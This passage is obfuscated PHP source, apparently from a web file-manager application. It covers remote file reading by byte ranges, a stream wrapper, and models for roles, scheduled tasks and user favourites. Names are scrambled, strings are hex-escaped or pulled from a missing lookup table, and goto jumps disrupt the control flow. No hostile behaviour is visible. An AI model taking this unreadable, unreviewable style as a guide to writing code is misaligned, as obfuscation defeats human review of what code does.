infoFull($‡ÁÈÓõ½) { return $this->infoParse($‡ÁÈÓõ½); } private function infoParse($ÊÄªÒ Ş) { $¦ñåÄ± =& $_SERVER[Å¶¨Şêº]; $ÓóàØÁ = $this->header($ÊÄªÒ Ş); if (!$ÓóàØÁ || !$ÓóàØÁ[$¦ñåÄ±[747]]) { return !1; } $Óãè²ñı = _get($ÓóàØÁ, $¦ñåÄ±[347], 0); $œõ³İç = array($¦ñåÄ±[42] => $ÓóàØÁ[$¦ñåÄ±[42]], $¦ñåÄ±[95] => $ÊÄªÒ Ş, $¦ñåÄ±[43] => $¦ñåÄ±[211], $¦ñåÄ±[87] => intval($Óãè²ñı), $¦ñåÄ±[185] => get_path_ext($ÓóàØÁ[$¦ñåÄ±[42]]), $¦ñåÄ±[1388] => $Óãè²ñı > 0 && $ÓóàØÁ[$¦ñåÄ±[1510]], $¦ñåÄ±[1389] => !1); return $œõ³İç; } private function header($ÀÉ‘ÂıÚ) { $¾Äè€á =& $_SERVER[Å¶¨Şêº]; if (isset(self::$_cacheHeader[$ÀÉ‘ÂıÚ])) { return self::$_cacheHeader[$ÀÉ‘ÂıÚ]; } $´¢ä—å˜ = isset($GLOBALS[$¾Äè€á[1511]]) ? $GLOBALS[$¾Äè€á[1511]] : !1; $GLOBALS[$¾Äè€á[1511]] = !0; self::$_cacheHeader[$ÀÉ‘ÂıÚ] = url_header($ÀÉ‘ÂıÚ); $GLOBALS[$¾Äè€á[1511]] = $´¢ä—å˜; return self::$_cacheHeader[$ÀÉ‘ÂıÚ]; } public function hashSimple($Ÿ·’òİ¡, $ëıò£‰ = false) { $½„»¤ıü =& $_SERVER[Å¶¨Şêº]; $ŞàÒ¨ = $this->info($Ÿ·’òİ¡); if (!$ŞàÒ¨ || !$ŞàÒ¨[$½„»¤ıü[213]]) { return !1; } $Ãûßú°î = $ŞàÒ¨[$½„»¤ıü[87]]; $ï‡àÎÂ = 200; $‰úí‡‰Ó = 50; if ($Ãûßú°î <= $ï‡àÎÂ * $‰úí‡‰Ó) { return md5($this->fileSubstr($Ÿ·’òİ¡, 0, $Ãûßú°î)) . $Ãûßú°î; } $–•Ÿê²Å = intval($Ãûßú°î / $‰úí‡‰Ó); $ù‘£´Ï  = $½„»¤ıü[12]; $‚»²üˆØ = timeFloat(); $ÀÃâ¿î° = 15; for ($Éª™ÉÅ = 0; $Éª™ÉÅ < $‰úí‡‰Ó; $Éª™ÉÅ++) { if (timeFloat() - $‚»²üˆØ > $ÀÃâ¿î°) { return !1; } $ùÜşŞÒã = $this->fileSubstr($Ÿ·’òİ¡, $–•Ÿê²Å * $Éª™ÉÅ, $ï‡àÎÂ); if (!$ùÜşŞÒã) { return !1; } $ù‘£´Ï  .= $ùÜşŞÒã; } $ù‘£´Ï  .= $this->fileSubstr($Ÿ·’òİ¡, $Ãûßú°î - $ï‡àÎÂ, $ï‡àÎÂ); return md5($ù‘£´Ï ) . $Ãûßú°î; } public function getContent($áè¥ÖÃğ) { return $this->fileSubstr($áè¥ÖÃğ); } public function fileSubstr($‰Âß€€—, $ŠøÛ˜Š = 0, $„¹”Ò¡à = -1) { $«ó¸… =& $_SERVER[Å¶¨Şêº]; $Ÿèè‹ÁÚ = $this->info($‰Âß€€—); if (!$Ÿèè‹ÁÚ || !$Ÿèè‹ÁÚ[$«ó¸…[213]] && $Ÿèè‹ÁÚ[$«ó¸…[87]] > 1024 * 1024 * 10) { return !1; } if ($„¹”Ò¡à === -1) { $„¹”Ò¡à = $Ÿèè‹ÁÚ[$«ó¸…[87]]; } if ($„¹”Ò¡à == 0) { return $«ó¸…[12]; } $®ëğ±í  = array($«ó¸…[1512] . $ŠøÛ˜Š . $«ó¸…[780] . ($ŠøÛ˜Š + $„¹”Ò¡à - 1)); $”’ å¯Æ = url_request($‰Âß€€—, $«ó¸…[241], !1, $®ëğ±í , !1, !1, 30); return $”’ å¯Æ[$«ó¸…[1200]] ? $”’ å¯Æ[$«ó¸…[1200]] : $«ó¸…[12]; } public function download($¨¡÷Äà‹, $Õ¨Ó¥ãù) { Downloader::start($¨¡÷Äà‹, $Õ¨Ó¥ãù); return $Õ¨Ó¥ãù; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($‘ƒûñÂì, $âúæßªÍ = '') { $this->info = $this->info($‘ƒûñÂì); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Å¶¨Şêº][95]]; $this->pathOpen = $‘ƒûñÂì; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$‘ƒûñÂì])) { self::$_chunkBuffer[$‘ƒûñÂì] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($‡‡†ŸŠ†) { $•¯™Å× = $this->fileSubstr($this->pose, $‡‡†ŸŠ†); $this->pose += strlen($•¯™Å×); return $•¯™Å×; } public function stream_tell() { return $this->pose; } public function stream_seek($Ï£ı­Äè, $…ğ‡à›ö) { $ê¬£Å– =& $_SERVER[Å¶¨Şêº]; if ($…ğ‡à›ö == SEEK_SET) { $this->pose = $Ï£ı­Äè; } else { if ($…ğ‡à›ö == SEEK_CUR) { $this->pose += $Ï£ı­Äè; } else { if ($…ğ‡à›ö == SEEK_END) { $this->pose = $this->info[$ê¬£Å–[87]] + intval($Ï£ı­Äè); } } } if ($Ï£ı­Äè < 0) { $this->pose = $this->info[$ê¬£Å–[87]] + $Ï£ı­Äè; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Å¶¨Şêº][87]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ä²­Ğ”î, $Îãş¸ŒÚ) { $êæ†Éöª =& $_SERVER[Å¶¨Şêº]; $¬óõöÏò = $this->info($Ä²­Ğ”î); return array($êæ†Éöª[1513] => 0, $êæ†Éöª[1514] => 0, $êæ†Éöª[26] => 32768 + 511, $êæ†Éöª[1515] => 0, $êæ†Éöª[1516] => 0, $êæ†Éöª[1517] => 0, $êæ†Éöª[1518] => 0, $êæ†Éöª[87] => $¬óõöÏò[$êæ†Éöª[87]], $êæ†Éöª[1519] => $¬óõöÏò[$êæ†Éöª[1387]], $êæ†Éöª[1475] => $¬óõöÏò[$êæ†Éöª[96]], $êæ†Éöª[1474] => $¬óõöÏò[$êæ†Éöª[212]], $êæ†Éöª[1520] => 0, $êæ†Éöª[1521] => 0); } static $fileInfo = array(); public function info($¢ïÒ÷) { $øÛÄÂ›› = $_SERVER[Å¶¨Şêº][1522]; if (isset(self::$fileInfo[$¢ïÒ÷])) { return self::$fileInfo[$¢ïÒ÷]; } if (substr($¢ïÒ÷, 0, strlen($øÛÄÂ››)) != $øÛÄÂ››) { return !1; } self::$fileInfo[$¢ïÒ÷] = IO::info(substr($¢ïÒ÷, strlen($øÛÄÂ››))); return self::$fileInfo[$¢ïÒ÷]; } public static function read($î´¯³ë™, $¬®£¬í„, $Õ×§â²Ï) { if (!isset(self::$_fopenCache[$î´¯³ë™])) { $€ò†í = new StreamWrapperIO(); $€ò†í->stream_open($î´¯³ë™); self::$_fopenCache[$î´¯³ë™] = $€ò†í; } $€ò†í = self::$_fopenCache[$î´¯³ë™]; return $€ò†í->fileSubstr($¬®£¬í„, $Õ×§â²Ï); } public static function _read($”®Ñ¿¼, $”¹À®ĞË, $ö¹§•­½) { $‘ãŠóî =& $_SERVER[Å¶¨Şêº]; $ĞÆš¢ÈÃ = fopen($”®Ñ¿¼, $‘ãŠóî[1391]); if (!$ĞÆš¢ÈÃ) { return $‘ãŠóî[12]; } $’Ÿ•¿ˆÅ = 8192; fseek($ĞÆš¢ÈÃ, $”¹À®ĞË, SEEK_SET); $ƒş¡†áğ = $‘ãŠóî[12]; $¸ì´×şâ = 0; while ($¸ì´×şâ < $ö¹§•­½) { $÷‰İé¡ = min($’Ÿ•¿ˆÅ, $ö¹§•­½ - $¸ì´×şâ); $ƒş¡†áğ .= fread($ĞÆš¢ÈÃ, $÷‰İé¡); $¸ì´×şâ += $÷‰İé¡; } fclose($ĞÆš¢ÈÃ); return $ƒş¡†áğ; } public function fileSubstr($™îÎˆÓ«, $„ö¦Ï›â) { $ŸşÙÈ  =& $_SERVER[Å¶¨Şêº]; $Ì’ÜÍµ’ = $this->info[$ŸşÙÈ [87]]; $Ä‚¡ïá = $™îÎˆÓ«; $ÈÚé©Çå = $„ö¦Ï›â; if ($™îÎˆÓ« < 0) { $™îÎˆÓ« = $Ì’ÜÍµ’ + $™îÎˆÓ«; } if ($„ö¦Ï›â === !1) { $„ö¦Ï›â = $Ì’ÜÍµ’ - $™îÎˆÓ«; } if ($™îÎˆÓ« + $„ö¦Ï›â > $Ì’ÜÍµ’) { $„ö¦Ï›â = $Ì’ÜÍµ’ - $™îÎˆÓ«; } if ($„ö¦Ï›â <= 0) { return $ŸşÙÈ [12]; } if ($™îÎˆÓ« < 0 || $™îÎˆÓ« >= $Ì’ÜÍµ’ || $„ö¦Ï›â <= 0 || $„ö¦Ï›â > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\154\x65\x52\145\141\x64\x20\x65\162\x72\157\162\x21\x20\163\x74\x61\x72\164\x3d{$™îÎˆÓ«}\73\154\145\x6e\147\164\150\75{$„ö¦Ï›â}\x3b\40\x73\x69\x7a\x65\x3d{$Ì’ÜÍµ’}\73"); } $•›ºĞ¡¡ = 64 * 1024; $Êß‚ëÁ‹ =& self::$_chunkBuffer[$this->path]; if (!$Êß‚ëÁ‹) { $Êß‚ëÁ‹ = array(); } $ëş¶ø† = 0; $şº´Ôß± = 0; $äÑùŒ‡ = $ŸşÙÈ [12]; foreach ($Êß‚ëÁ‹ as $ëş¶ø† => $äÑùŒ‡) { $ëş¶ø† = intval($ëş¶ø†); $şº´Ôß± = $ëş¶ø† + strlen($äÑùŒ‡); if ($™îÎˆÓ« >= $şº´Ôß±) { continue; } if ($™îÎˆÓ« >= $ëş¶ø† && $™îÎˆÓ« + $„ö¦Ï›â <= $şº´Ôß±) { return substr($äÑùŒ‡, $™îÎˆÓ« - $ëş¶ø†, $„ö¦Ï›â); } break; } if (count($Êß‚ëÁ‹) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ŸşÙÈ [1523], $ŸşÙÈ [1524] . count($Êß‚ëÁ‹) . "\x3b\x73\x74\141\x72\x74\75{$™îÎˆÓ«}\x2c\x6c\145\x6e\147\x74\150\75{$„ö¦Ï›â}\73\160\x6f\x73\x65\x3a{$ëş¶ø†}\x7e{$şº´Ôß±}"); throw new Exception($ŸşÙÈ [1525]); } $àÖ¼¿«ü = intval($™îÎˆÓ« / $•›ºĞ¡¡) * $•›ºĞ¡¡; $©ßØÜ… = ceil(($™îÎˆÓ« + $„ö¦Ï›â) / $•›ºĞ¡¡) * $•›ºĞ¡¡ - $àÖ¼¿«ü; $ïŒå¿Ê° = IO::fileSubstr($this->path, $àÖ¼¿«ü, $©ßØÜ…); $Êß‚ëÁ‹[$àÖ¼¿«ü . $ŸşÙÈ [12]] = $ïŒå¿Ê°; ksort($Êß‚ëÁ‹); $ÖëÂÔŒ¤ = substr($ïŒå¿Ê°, $™îÎˆÓ« - $àÖ¼¿«ü, $„ö¦Ï›â); return $ÖëÂÔŒ¤; } private function log($×Ï‚é±, $óóŠªŠ) { $çµè²ÙË =& $_SERVER[Å¶¨Şêº]; $Í™çá³Ë = timeFloat() - $this->timeStart; write_log(sprintf($çµè²ÙË[1526], $×Ï‚é±, $this->info[$çµè²ÙË[42]], $Í™çá³Ë, $óóŠªŠ), $çµè²ÙË[1179]); } } class Message { function __construct() { } public function send($”ïŒ‘Âõ = '', $áû×ì“¤ = array(), $àåòÁÀÊ = "\x74\145\x78\x74") { $äøƒò =& $_SERVER[Å¶¨Şêº]; $«§±¹¹ƒ = array($äøƒò[43] => $äøƒò[1527], $äøƒò[752] => $”ïŒ‘Âõ); if (in_array($àåòÁÀÊ, array($äøƒò[1527], $äøƒò[1528]))) { $«§±¹¹ƒ[$äøƒò[43]] = $àåòÁÀÊ; } $áû×ì“¤ = array($äøƒò[514] => isset($áû×ì“¤[$äøƒò[514]]) ? $áû×ì“¤[$äøƒò[514]] : $äøƒò[12], $äøƒò[599] => isset($áû×ì“¤[$äøƒò[599]]) ? $áû×ì“¤[$äøƒò[599]] : $äøƒò[12]); if (empty($”ïŒ‘Âõ) || empty($áû×ì“¤[$äøƒò[514]]) && empty($áû×ì“¤[$äøƒò[599]])) { return !1; } $Ö²ÌõÒ» = array($äøƒò[1468] => $«§±¹¹ƒ, $äøƒò[1529] => $áû×ì“¤); Hook::trigger($äøƒò[1530], $Ö²ÌõÒ»); } } goto DóÇ—â¶Å; CÕƒù½ÓŒè: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x72\157\x6c\145\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\141\x75\x74\x68", "\x6c\x61\142\145\154", "\144\x69\x73\x70\154\141\171", "\163\171\x73\164\x65\155", "\x64\145\163\x63", "\x69\x67\x6e\157\x72\145\105\x78\x74", "\151\147\x6e\x6f\x72\145\106\151\x6c\x65\x53\x69\172\x65", "\141\x64\x6d\x69\156\151\163\x74\x72\x61\x74\157\162", "\163\157\162\164"); public function listData($ù…ÄÍ¥‹ = false, $ïò¯ªĞÈ = "\163\157\162\x74", $Š”ŒşÈë = false) { $ºçî¬ÎÄ =& $_SERVER[Å¶¨Şêº]; $ÉØî¢×” = parent::listData($ù…ÄÍ¥‹, $ïò¯ªĞÈ, $Š”ŒşÈë); if (!$ù…ÄÍ¥‹) { foreach ($ÉØî¢×” as $é¢•ú­¬ => $ªœŞ¿³î) { if ($ªœŞ¿³î[$ºçî¬ÎÄ[2054]] == 1) { $ÉØî¢×”[$é¢•ú­¬][$ºçî¬ÎÄ[462]] = LNG($ºçî¬ÎÄ[2289]); } } } return $ÉØî¢×”; } public function update($ÉÕ¸Ö³, $ï±óÚô¶) { $“‡ÛŒÌ’ =& $_SERVER[Å¶¨Şêº]; $à¼¸²¡è = parent::listData($ÉÕ¸Ö³); $í´®€’ú = $this->findByName($ï±óÚô¶[$“‡ÛŒÌ’[42]]); if (!$à¼¸²¡è || $í´®€’ú && $í´®€’ú[$“‡ÛŒÌ’[408]] != $à¼¸²¡è[$“‡ÛŒÌ’[408]]) { return !1; } if ($í´®€’ú[$“‡ÛŒÌ’[2054]] == 1) { $ï±óÚô¶ = array($“‡ÛŒÌ’[42] => $ï±óÚô¶[$“‡ÛŒÌ’[42]], $“‡ÛŒÌ’[1875] => $ï±óÚô¶[$“‡ÛŒÌ’[1875]]); } $this->filterAuth($ï±óÚô¶[$“‡ÛŒÌ’[422]]); return parent::update($ÉÕ¸Ö³, $ï±óÚô¶); } public function remove($±Ú¿ÃÙ) { $µü™ú°¹ = parent::listData($±Ú¿ÃÙ); if (!$µü™ú°¹ || $µü™ú°¹[$_SERVER[Å¶¨Şêº][1282]]) { return !1; } return parent::remove($±Ú¿ÃÙ); } public function add($âáò) { $¡óÉğì =& $_SERVER[Å¶¨Şêº]; $áÉœŸ¦— = $âáò[$¡óÉğì[42]]; if ($this->findByName($áÉœŸ¦—)) { return !1; } $û˜¢¦›› = array($¡óÉğì[429] => $áÉœŸ¦—, $¡óÉğì[1858] => $¡óÉğì[12], $¡óÉğì[1854] => $¡óÉğì[1862], $¡óÉğì[2290] => 1, $¡óÉğì[1857] => 0, $¡óÉğì[2291] => 0, $¡óÉğì[1856] => $this->getSort()); $âáò = array_merge($û˜¢¦››, $âáò); $this->filterAuth($âáò[$¡óÉğì[422]]); return parent::insert($âáò); } private function getSort() { $ÎË“ËÏğ =& $_SERVER[Å¶¨Şêº]; $µş‡¸ñğ = parent::listData(); $°²¨É’ú = array_to_keyvalue($µş‡¸ñğ, $ÎË“ËÏğ[12], $ÎË“ËÏğ[1876]); return empty($°²¨É’ú) ? 0 : max($°²¨É’ú) + 1; } private function filterAuth(&$‚†á·øİ) { $¥èıÀÒ¶ =& $_SERVER[Å¶¨Şêº]; $şÆÃÁÄ = array(); $Ü’ğ¯İŸ = array_filter(explode($¥èıÀÒ¶[60], $‚†á·øİ)); foreach ($Ü’ğ¯İŸ as $‚†á·øİ) { $‚ãù’— = explode($¥èıÀÒ¶[10], $‚†á·øİ); if ($‚ãù’—[0] == $¥èıÀÒ¶[2292] && $‚ãù’—[1] != $¥èıÀÒ¶[1188]) { $ë‰Œñáª = $‚ãù’—[0] . $¥èıÀÒ¶[10] . $‚ãù’—[1] . $¥èıÀÒ¶[2293]; if (!in_array($ë‰Œñáª, $Ü’ğ¯İŸ)) { $şÆÃÁÄ[] = $ë‰Œñáª; } } $şÆÃÁÄ[] = $‚†á·øİ; } $‚†á·øİ = implode($¥èıÀÒ¶[60], $şÆÃÁÄ); } public function findRoleDefault() { $¾¤Ñ²è =& $_SERVER[Å¶¨Şêº]; $…¸Ìğñ¼ = parent::listData(); $è§§¯æœ = !1; foreach ($…¸Ìğñ¼ as $ƒğı¬¡) { if (!$ƒğı¬¡ || $ƒğı¬¡[$¾¤Ñ²è[1874]] == $¾¤Ñ²è[209] || $ƒğı¬¡[$¾¤Ñ²è[2054]] == 1) { continue; } if (strstr($ƒğı¬¡[$¾¤Ñ²è[422]], $¾¤Ñ²è[2294])) { continue; } if (!strstr($ƒğı¬¡[$¾¤Ñ²è[422]], $¾¤Ñ²è[2295])) { continue; } if (!$è§§¯æœ) { $è§§¯æœ = $ƒğı¬¡; continue; } $úİõşçì = explode($¾¤Ñ²è[60], $è§§¯æœ[$¾¤Ñ²è[422]]); $Íë„„‹´ = explode($¾¤Ñ²è[60], $ƒğı¬¡[$¾¤Ñ²è[422]]); if (count($úİõşçì) > count($Íë„„‹´)) { $è§§¯æœ = $ƒğı¬¡; } } return $è§§¯æœ ? $è§§¯æœ[$¾¤Ñ²è[408]] : $¾¤Ñ²è[12]; } public function sort($ı’“€Î´, $Ú»¦¢í) { return parent::update($ı’“€Î´, $Ú»¦¢í); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\164\141\163\153\114\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x74\171\160\x65", "\145\166\145\156\164", "\x74\x69\x6d\x65", "\144\x65\163\x63", "\163\x79\x73\x74\x65\155", "\x65\156\141\x62\154\145", "\x6c\141\163\x74\122\165\156", "\x73\157\x72\164"); public function listData($œ´Šõ”† = false, $ë˜õ™©§ = "\163\x6f\x72\x74", $ııâ‡â = false) { return parent::listData($œ´Šõ”†, $ë˜õ™©§, $ııâ‡â); } public function add($áğò³ñâ) { $˜Ú»şÉÔ =& $_SERVER[Å¶¨Şêº]; $êÒº‹¾ = $this->findByName($áğò³ñâ[$˜Ú»şÉÔ[42]]); if ($êÒº‹¾) { return !1; } $áğò³ñâ[$˜Ú»şÉÔ[1623]] = 0; $áğò³ñâ[$˜Ú»şÉÔ[1876]] = $this->getSort(); return parent::insert($áğò³ñâ); } private function getSort() { $†… öÂ =& $_SERVER[Å¶¨Şêº]; $ôÕÒŸñù = parent::listData(); $Úà¥–ûÔ = array_to_keyvalue($ôÕÒŸñù, $†… öÂ[12], $†… öÂ[1876]); return empty($Úà¥–ûÔ) ? 0 : max($Úà¥–ûÔ) + 1; } public function update($™ˆÓåë, $í†ìã«) { $¸ß«·ìµ =& $_SERVER[Å¶¨Şêº]; $Ä¢°Šêü = $this->listData($™ˆÓåë); $šÃ­•Ìñ = $this->findByName($í†ìã«[$¸ß«·ìµ[42]]); if (!$Ä¢°Šêü || $šÃ­•Ìñ && $šÃ­•Ìñ[$¸ß«·ìµ[408]] != $Ä¢°Šêü[$¸ß«·ìµ[408]]) { return !1; } return parent::update($™ˆÓåë, $í†ìã«); } public function remove($ôç¾’Å¦, $ı¯åŞ = false) { $è´µ½ª =& $_SERVER[Å¶¨Şêº]; $ÍœÕÓßù = $this->listData($ôç¾’Å¦); if (!$ÍœÕÓßù) { return; } if (!$ı¯åŞ && $ÍœÕÓßù[$è´µ½ª[1282]] == $è´µ½ª[99]) { return !1; } return parent::remove($ôç¾’Å¦); } public function enable($¡ùĞé•ö, $¼ÚÎ§õï) { return $this->update($¡ùĞé•ö, array($_SERVER[Å¶¨Şêº][2284] => $¼ÚÎ§õï)); } public function run($åªˆ¶) { return $this->update($åªˆ¶, array($_SERVER[Å¶¨Şêº][2296] => time())); } } goto dàà¸Å´œš; dàà¸Å´œš: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\141\x76"; protected function cacheFunctionAlias($à‰×ÖÎ‘) { $œî‡¾ò¥ =& $_SERVER[Å¶¨Şêº]; return array($œî‡¾ò¥[1963] => array(USER_ID, $œî‡¾ò¥[2297])); } protected function listData() { $Õ…Åñš’ =& $_SERVER[Å¶¨Şêº]; $íÏ—‘ä = array($Õ…Åñš’[1654] => USER_ID, $Õ…Åñš’[492] => 0); $ÛÉ…ÚäÉ = $Õ…Åñš’[2298]; $³¦óàËÙ = $this->field($ÛÉ…ÚäÉ)->where($íÏ—‘ä)->order($Õ…Åñš’[2299])->select(); return $³¦óàËÙ ? $³¦óàËÙ : array(); } protected function resetCache() { } protected function listView() { $¦¤÷é’µ =& $_SERVER[Å¶¨Şêº]; $ñàÑ¿­Ê = $this->listData(); $¢äèÑ‰™ = array_filter_by_field($ñàÑ¿­Ê, $¦¤÷é’µ[43], $¦¤÷é’µ[425]); $½‚®•¼µ = array_to_keyvalue($¢äèÑ‰™, $¦¤÷é’µ[12], $¦¤÷é’µ[95]); if (!$½‚®•¼µ) { return $ñàÑ¿­Ê; } $Š»™½¼· = 2000; $æà¢µµî = array($¦¤÷é’µ[426] => array($¦¤÷é’µ[427], $½‚®•¼µ)); $Â®ôñí = Model($¦¤÷é’µ[823])->listSource($æà¢µµî, $Š»™½¼·); $Â®ôñí = array_merge($Â®ôñí[$¦¤÷é’µ[94]], $Â®ôñí[$¦¤÷é’µ[93]]); $Â®ôñí = array_to_keyvalue($Â®ôñí, $¦¤÷é’µ[411]); foreach ($ñàÑ¿­Ê as $Íö¡Ôğë => $²£æö½) { $ÅúÃù—„ = $Â®ôñí[$²£æö½[$¦¤÷é’µ[95]]]; $ÅúÃù—„ = $ÅúÃù—„ ? $ÅúÃù—„ : array(); $ñàÑ¿­Ê[$Íö¡Ôğë] = array_merge($ÅúÃù—„, $²£æö½); } return $ñàÑ¿­Ê; } protected function addFav($š áµşĞ, $Š ¥Ã‚é = '', $ÛŒÏÁ¤¥ = "\163\x6f\165\162\143\x65") { $÷Î‚š¬ñ =& $_SERVER[Å¶¨Şêº]; $”É³µ– = array($÷Î‚š¬ñ[1654] => USER_ID, $÷Î‚š¬ñ[492] => 0, $÷Î‚š¬ñ[431] => $ÛŒÏÁ¤¥, $÷Î‚š¬ñ[430] => $š áµşĞ); if ($this->where($”É³µ–)->find()) { return !1; } $”É³µ– = array($÷Î‚š¬ñ[1654] => USER_ID, $÷Î‚š¬ñ[492] => 0); $¹°´ô‹Ø = $this->where($”É³µ–)->max($÷Î‚š¬ñ[1876]); if (!$¹°´ô‹Ø) { $¹°´ô‹Ø = 0; } if (!$Š ¥Ã‚é && $ÛŒÏÁ¤¥ == $÷Î‚š¬ñ[425]) { $ˆšùó£ = Model($÷Î‚š¬ñ[1337])->where(array($÷Î‚š¬ñ[426] => $š áµşĞ))->find(); if (!$ˆšùó£) { return !1; } $Š ¥Ã‚é = $ˆšùó£[$÷Î‚š¬ñ[42]]; } $Š ¥Ã‚é = $this->getAutoName($Š ¥Ã‚é); $’¹Ó—¨Ä = array($÷Î‚š¬ñ[1654] => USER_ID, $÷Î‚š¬ñ[492] => 0, $÷Î‚š¬ñ[429] => $Š ¥Ã‚é, $÷Î‚š¬ñ[430] => $š áµşĞ, $÷Î‚š¬ñ[431] => $ÛŒÏÁ¤¥, $÷Î‚š¬ñ[1856] => $¹°´ô‹Ø + 1); return $this->add($’¹Ó—¨Ä); } protected function remove($™ãüÆÚë) { $Òú‚¸ =& $_SERVER[Å¶¨Şêº]; $ø‘Ğ­°ñ = array($Òú‚¸[1654] => USER_ID, $Òú‚¸[428] => $™ãüÆÚë); return $this->where($ø‘Ğ­°ñ)->delete(); } protected function removeByName($û¿ãâÙ˜) { $Š— í¸ =& $_SERVER[Å¶¨Şêº]; $Ø„›À¿¬ = array($Š— í¸[1654] => USER_ID, $Š— í¸[429] => $û¿ãâÙ˜, $Š— í¸[492] => 0); return $this->where($Ø„›À¿¬)->delete(); } protected function rename($µÜå¤±§, $·Ëº„ä) { $¤ùêÃ¯ä =& $_SERVER[Å¶¨Şêº]; if ($µÜå¤±§ == $·Ëº„ä) { return !1; } $Ç›¨Æ» = $this->getAutoName($·Ëº„ä); if ($·Ëº„ä != $Ç›¨Æ») { return !1; } $À§üü«à = array($¤ùêÃ¯ä[1654] => USER_ID, $¤ùêÃ¯ä[492] => 0, $¤ùêÃ¯ä[42] => $µÜå¤±§); return $this->where($À§üü«à)->save(array($¤ùêÃ¯ä[42] => $·Ëº„ä)); } protected function resetSort($—¥¿‡ß”) { $æ‚º®½Í =& $_SERVER[Å¶¨Şêº]; $—¥¿‡ß” = is_array($—¥¿‡ß”) ? $—¥¿‡ß” : array(); $”„¡ÌÊ = array($æ‚º®½Í[1654] => USER_ID); for ($—¿Â …Ñ = 0; $—¿Â …Ñ < count($—¥¿‡ß”); $—¿Â …Ñ++) { $”„¡ÌÊ[$æ‚º®½Í[428]] = $—¥¿‡ß”[$—¿Â …Ñ]; $this->where($”„¡ÌÊ)->save(array($æ‚º®½Í[1856] => $—¿Â …Ñ + 1)); } return !0; } protected function moveTop($Õü§®¶›) { $ôµÏ®‰„ =& $_SERVER[Å¶¨Şêº]; $º¿­×ô = array($ôµÏ®‰„[1654] => USER_ID, $ôµÏ®‰„[492] => 0); $§›§×ªº = $this->where($º¿­×ô)->where(array($ôµÏ®‰„[42] => $Õü§®¶›))->find(); if (!$§›§×ªº) { return; } $éà…¥ = $this->field($ôµÏ®‰„[408])->where($º¿­×ô)->order($ôµÏ®‰„[2299])->select(); $éà…¥ = array_to_keyvalue($éà…¥, $ôµÏ®‰„[12], $ôµÏ®‰„[408]); $¢Ôáµ©º = $éà…¥; $éà…¥ = array_remove_value($éà…¥, $§›§×ªº[$ôµÏ®‰„[408]]); array_unshift($éà…¥, $§›§×ªº[$ôµÏ®‰„[408]]); return $this->resetSort($éà…¥); } protected function moveBottom($šÌáìÁØ) { $ÀÎó×¤ª =& $_SERVER[Å¶¨Şêº]; $î¤ö·ìÈ = array($ÀÎó×¤ª[1654] => USER_ID, $ÀÎó×¤ª[492] => 0); $•ŞğÁì— = $this->where($î¤ö·ìÈ)->max($ÀÎó×¤ª[1876]); $­¾Ô¥á‹ = array($ÀÎó×¤ª[1876] => $•ŞğÁì— + 1); return $this->where($î¤ö·ìÈ)->where(array($ÀÎó×¤ª[42] => $šÌáìÁØ))->save($­¾Ô¥á‹); } private function getAutoName($·üÄÕ½š) { $öÆ‚æ =& $_SERVER[Å¶¨Şêº]; $ŒŠ½‘¨ë = array($öÆ‚æ[1654] => USER_ID, $öÆ‚æ[492] => 0); $“Ü¿‡¹Ö = $this->field($öÆ‚æ[42])->where($ŒŠ½‘¨ë)->select(); $“Ü¿‡¹Ö = array_to_keyvalue($“Ü¿‡¹Ö, $öÆ‚æ[12], $öÆ‚æ[42]); if (!$“Ü¿‡¹Ö || !in_array($·üÄÕ½š, $“Ü¿‡¹Ö)) { return $·üÄÕ½š; } for ($» É³áä = 0; $» É³áä < count($“Ü¿‡¹Ö); $» É³áä++) { if (!in_array($·üÄÕ½š . "\50{$» É³áä}\51", $“Ü¿‡¹Ö)) { return $·üÄÕ½š . "\50{$» É³áä}\x29"; } } return $·üÄÕ½š . "\50{$» É³áä}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\152\157\x62\114\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x64\x65\x73\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\145\x6c\146\112\x6f\142\x4c\x69\x73\164"; public function listData($ÎüÜ£€ = false, $ÏôÙª³ = "\x73\x6f\162\x74", $©Ë³¨ªÂ = false) { return parent::listData($ÎüÜ£€, $ÏôÙª³, $©Ë³¨ªÂ); } public function remove($©ä¾Àš›) { return parent::remove($©ä¾Àš›); } public function add($³‘“œå£) { $•Ê™ï =& $_SERVER[Å¶¨Şêº]; if ($this->findByName($³‘“œå£[$•Ê™ï[42]])) { return !1; } $³‘“œå£[$•Ê™ï[1876]] = $this->getSort(); return parent::insert($³‘“œå£); } private function getSort() { $Ê‚í¼½ =& $_SERVER[Å¶¨Şêº]; $–Š—‚„£ = parent::listData(); $‘®¡ëÂ¸ = array_to_keyvalue($–Š—‚„£, $Ê‚í¼½[12], $Ê‚í¼½[1876]); return empty($‘®¡ëÂ¸) ? 0 : max($‘®¡ëÂ¸) + 1; } public function update($ˆ—÷‹Ñ, $ùÅ“ı•­) { $øÖŒñ­ =& $_SERVER[Å¶¨Şêº]; $³õÒÍÚµ = parent::listData($ˆ—÷‹Ñ); $Í€·¢ò– = $this->findByName($ùÅ“ı•­[$øÖŒñ­[42]]); if (!$³õÒÍÚµ || $Í€·¢ò– && $Í€·¢ò–[$øÖŒñ­[408]] != $³õÒÍÚµ[$øÖŒñ­[408]]) { return !1; } return parent::update($ˆ—÷‹Ñ, $ùÅ“ı•­); } public function setUserJob($óç˜ÖÃâ, $ä‚šèİ´) { $Æª‰€Œ =& $_SERVER[Å¶¨Şêº]; if 